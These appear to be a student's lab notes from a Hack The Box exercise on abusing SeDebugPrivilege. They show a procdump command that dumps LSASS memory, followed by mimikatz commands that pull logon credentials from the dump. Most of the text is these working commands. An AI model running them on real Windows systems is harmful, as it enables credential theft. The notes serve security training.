# [SeDebugPrivilege](SeDebugPrivilege.md)
### Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.

```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
![](Screenshot%202026-08-18%20at%2020.58.21.png)

```cmd
C:\htb> mimikatz.exe

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```
![](Screenshot%202026-08-18%20at%2021.04.17.png)